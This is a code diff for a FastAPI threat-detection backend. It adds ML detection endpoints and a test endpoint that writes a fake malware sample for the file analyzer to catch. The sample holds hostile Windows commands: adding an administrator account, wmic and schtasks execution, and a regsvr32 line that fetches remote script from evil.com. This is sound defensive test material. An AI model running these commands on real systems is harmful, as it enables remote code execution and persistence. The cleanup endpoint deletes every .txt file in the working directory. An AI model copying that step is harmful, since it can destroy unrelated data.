+                "device_id": request.get('device_id', 'unknown'),
+                "description": f"Windows10 threat detected with confidence {result['confidence']:.2f}",
+                "detection_method": "trained_model",
+                "confidence": result['confidence'],
+                "metrics": {
+                    "prediction": result['prediction'],
+                    "top_features": result['top_features']
+                }
+            }
+            
+            # Add to alerts
+            alerts.append(alert)
+            
+            # Broadcast to WebSocket clients
+            await manager.broadcast_alert(alert)
+            
+            return {
+                "status": "success",
+                "threat_detected": True,
+                "result": result,
+                "alert": alert
+            }
+        else:
+            return {
+                "status": "success",
+                "threat_detected": False,
+                "result": result
+            }
+            
+    except Exception as e:
+        logger.error(f"Error in Windows10 detection: {e}")
+        raise HTTPException(status_code=500, detail=f"Error in Windows10 detection: {str(e)}")
+
+@app.post("/api/trained-models/ml-detect")
+async def ml_detect(request: Dict[str, Any]):
+    """Detect threats using the ML model"""
+    if not TRAINED_MODELS_AVAILABLE or ml_model is None:
+        raise HTTPException(status_code=503, detail="Trained models not available")
+    
+    try:
+        # Extract network data from request
+        network_data = request.get('network_data', {})
+        
+        # Run detection using ML model
+        result = ml_model.predict(network_data)
+        
+        # Create alert if threat detected
+        if result['is_threat']:
+            alert = {
+                "id": str(uuid.uuid4()),
+                "threat_type": result['threat_type'],
+                "severity": result['severity'],
+                "timestamp": datetime.now().isoformat(),
+                "status": "open",
+                "device_id": request.get('device_id', 'unknown'),
+                "description": f"Network threat detected: {result['threat_type']}",
+                "detection_method": "ml_model",
+                "confidence": result['confidence'],
+                "metrics": result.get('metrics', {})
+            }
+            
+            # Add to alerts
+            alerts.append(alert)
+            
+            # Broadcast to WebSocket clients
+            await manager.broadcast_alert(alert)
+            
+            return {
+                "status": "success",
+                "threat_detected": True,
+                "result": result,
+                "alert": alert
+            }
+        else:
+            return {
+                "status": "success",
+                "threat_detected": False,
+                "result": result
+            }
+            
+    except Exception as e:
+        logger.error(f"Error in ML detection: {e}")
+        raise HTTPException(status_code=500, detail=f"Error in ML detection: {str(e)}")
+
+@app.get("/api/trained-models/status")
+async def get_trained_models_status():
+    """Get status of trained models"""
+    return {
+        "status": "success",
+        "trained_models_available": TRAINED_MODELS_AVAILABLE,
+        "windows10_detector": windows10_detector is not None,
+        "ml_model": ml_model is not None,
+        "enhanced_modules_available": ENHANCED_MODULES_AVAILABLE,
+        "enhanced_detector": enhanced_detector is not None,
+        "timestamp": datetime.now().isoformat()
+    }
+
+# WebSocket endpoint
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
     client_id = await manager.connect(websocket)
     
     if not client_id:
-        return  # Connection failed
+        return
         
     try:
-        # Send initial alert data
-        initial_data = {"type": "initial", "alerts": alerts[:50]}  # Send last 50 alerts
+        # Send initial data
+        initial_data = {
+            "type": "initial", 
+            "alerts": alerts[:50],
+            "summary": await get_dashboard_summary()
+        }
         await websocket.send_text(json.dumps(initial_data))
-        logger.info(f"Sent initial alerts to client {client_id}")
+        logger.info(f"Sent initial data to client {client_id}")
         
-        # Keep connection open and handle messages
+        # Keep connection open
         while True:
             data = await websocket.receive_text()
             logger.debug(f"Received message from client {client_id}: {data[:100]}...")
             
-            # Process client messages if needed
             try:
                 msg = json.loads(data)
                 if msg.get("type") == "ping":
-                    await websocket.send_text(json.dumps({"type": "pong", "timestamp": datetime.now().isoformat()}))
+                    await websocket.send_text(json.dumps({
+                        "type": "pong", 
+                        "timestamp": datetime.now().isoformat()
+                    }))
             except:
                 pass
                 
@@ -562,43 +798,76 @@ async def websocket_endpoint(websocket: WebSocket):
         logger.error(f"WebSocket error with client {client_id}: {e}")
         manager.disconnect(client_id)
 
-# WebSocket endpoint for real-time network monitoring data
-@app.websocket("/ws/network")
-async def network_websocket_endpoint(websocket: WebSocket):
-    client_id = await network_manager.connect(websocket)
-    
-    if not client_id:
-        return  # Connection failed
-        
+@app.post("/api/test/create-malware-sample")
+async def create_malware_sample():
+    """Create a test malware sample file for testing purposes"""
     try:
-        # Send initial dataset when a client connects
-        initial_data = {
-            "inbound_traffic": list(network_data["inbound_traffic"]),
-            "outbound_traffic": list(network_data["outbound_traffic"]),
-            "packet_rate": list(network_data["packet_rate"]),
-            "active_connections": list(network_data["active_connections"]),
-            "warnings": list(network_data["warnings"]),
-            "type": "initial"
-        }
-        await websocket.send_text(json.dumps(initial_data))
-        logger.info(f"Sent initial network data to client {client_id}")
+        import tempfile
+        import os
         
-        # Keep the connection open and handle incoming messages
-        while True:
-            data = await websocket.receive_text()
-            logger.debug(f"Received message from network client {client_id}: {data[:100]}...")
-            
-            # Process client messages - handle ping/pong for connection health checks
-            try:
-                msg = json.loads(data)
-                if msg.get("type") == "ping":
-                    await websocket.send_text(json.dumps({"type": "pong", "timestamp": datetime.now().isoformat()}))
-            except:
-                pass
-                
-    except WebSocketDisconnect:
-        logger.info(f"Network WebSocket disconnected: Client {client_id}")
-        network_manager.disconnect(client_id)
+        # Create a temporary file with suspicious patterns
+        test_content = """This is a test malware sample file containing suspicious patterns:
+cmd.exe powershell DownloadString Invoke-Expression
+regsvr32 rundll32 wscript cscript mshta
+This file should trigger the file analyzer's pattern detection.
+Additional suspicious patterns:
+- net user administrator /add
+- wmic process call create "cmd.exe /c calc.exe"
+- schtasks /create /tn "malicious_task" /tr "cmd.exe /c echo hacked"
+- regsvr32 /s /u /i:http://evil.com/script.sct scrobj.dll
+"""
+        
+        # Create temp file
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, dir='.') as f:
+            f.write(test_content)
+            temp_file_path = f.name
+        
+        logger.info(f"Created test malware sample: {temp_file_path}")
+        
+        return {
+            "status": "success",
+            "file_path": temp_file_path,
+            "message": "Test malware sample created successfully",
+            "content_preview": test_content[:200] + "..."
+        }
+        
     except Exception as e:
-        logger.error(f"Network WebSocket error with client {client_id}: {e}")
-        network_manager.disconnect(client_id) 
+        logger.error(f"Error creating malware sample: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/test/cleanup-samples")
+async def cleanup_test_samples():
+    """Clean up test sample files"""
+    try:
+        import glob
+        import os
+        
+        # Find and delete test files
+        test_files = glob.glob("*.txt") + glob.glob("malware_sample*")
+        deleted_count = 0
+        
+        for file_path in test_files:
+            try:
+                if os.path.exists(file_path):
+                    os.remove(file_path)
+                    deleted_count += 1
+            except Exception as e:
+                logger.warning(f"Could not delete {file_path}: {e}")
+        
+        return {
+            "status": "success",
+            "deleted_files": deleted_count,
+            "message": f"Cleaned up {deleted_count} test files"
+        }
+        
+    except Exception as e:
+        logger.error(f"Error cleaning up test samples: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.on_event("startup")
+async def startup_event():
+    logger.info("Enhanced NeuralShield Backend started with all advanced detection modules")
+
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=8001)
